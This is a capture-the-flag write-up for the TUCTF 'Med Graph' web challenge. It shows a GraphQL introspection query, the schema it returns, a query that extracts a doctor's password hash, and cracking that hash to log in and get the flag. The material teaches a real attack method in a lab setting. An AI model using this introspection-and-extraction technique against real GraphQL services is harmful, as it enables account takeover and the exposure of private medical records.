------------

### CTF: TUCTF

------------

![image](https://github.com/user-attachments/assets/0103e628-3780-459b-9e5f-7ed118289138)

------------

### CHALLENGES-:

------------

- Web-:
  - Med Graph

--------------

### Med Graph

------------

![image](https://github.com/user-attachments/assets/74c149e9-855a-4a37-9682-9d271c00af13)

-------------

- After entering the provided creds, I noticed this graphql endpoint in the intercept tab.

![image](https://github.com/user-attachments/assets/cf8e3ed0-28a4-4b84-a15e-b1f75b3ec90f)

- The request contains this query `userData` which retrieves the `patient` and `doctor` information with fields `patient` and `doctor`.

```graphql

        {
            userData {
                name
                age
                medicalHistory
                medications {
                    name
                    dosage
                    description
                }
                doctor {
                    name
                    department
                }
            }
        }
```

- I sent it to repeater and copied an introspection query to the graphql tab to discover the graphql schema of the webpage.

![image](https://github.com/user-attachments/assets/ac24323f-0fd0-4aea-9304-de1d853a32ce)

- Introspection query

```graphql
query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```
- I found other valid fields for the field Object `doctor` like `name`,`id` and `password` in the introspection schema.I added it to the query and got the hashed password for the doctor.

```graphql
{
              "args": [],
              "deprecationReason": null,
              "description": null,
              "isDeprecated": false,
              "name": "doctor",
              "type": {
                "kind": "OBJECT",
                "name": "DoctorType",
                "ofType": null
              }
            },
            {
              "args": [],
              "deprecationReason": null,
              "description": null,
              "isDeprecated": false,
              "name": "appointment",
              "type": {
                "kind": "OBJECT",
                "name": "AppointmentType",
                "ofType": null
              }
            }
          ],
          "inputFields": null,
          "interfaces": [],
          "kind": "OBJECT",
          "name": "MedicationType",
          "possibleTypes": null
        },
        {
          "description": null,
          "enumValues": null,
          "fields": [
            {
              "args": [],
              "deprecationReason": null,
              "description": null,
              "isDeprecated": false,
              "name": "id",
              "type": {
                "kind": "SCALAR",
                "name": "Int",
                "ofType": null
              }
            },
            {
              "args": [],
              "deprecationReason": null,
              "description": null,
              "isDeprecated": false,
              "name": "name",
              "type": {
                "kind": "SCALAR",
                "name": "String",
                "ofType": null
              }
            },
            {
              "args": [],
              "deprecationReason": null,
              "description": null,
              "isDeprecated": false,
              "name": "department",
              "type": {
                "kind": "SCALAR",
                "name": "String",
                "ofType": null
              }
            },
            {
              "args": [],
              "deprecationReason": null,
              "description": null,
              "isDeprecated": false,
              "name": "password",
              "type": {
                "kind": "SCALAR",
                "name": "String",
                "ofType": null
              }
            },
            {
              "args": [],
              "deprecationReason": null,
              "description": null,
              "isDeprecated": false,
              "name": "patients",
              "type": {
                "kind": "LIST",
                "name": null,
                "ofType": {
                  "kind": "OBJECT",
                  "name": "PatientType",
                  "ofType": null
                }
              }
            }
          ]
```

- Query-:

![image](https://github.com/user-attachments/assets/45db9d2e-4df7-43ff-86ec-f907a21a02cc)

- Response-:

![image](https://github.com/user-attachments/assets/dd34232a-3970-413b-b1cf-92c064a430c3)

- I was able to crack the hash with `crackstation.net`.

![image](https://github.com/user-attachments/assets/3dc5ed01-356d-4b45-978e-d9eb56702fc9)

- Doctor Ivy's  account accessed-:

![image](https://github.com/user-attachments/assets/a6eef09f-02b3-457e-bc3d-b70dae13a28f)

- Flag-:

```TUCTF{w3_7h1nk_1n_6r4ph5}```

-------------------















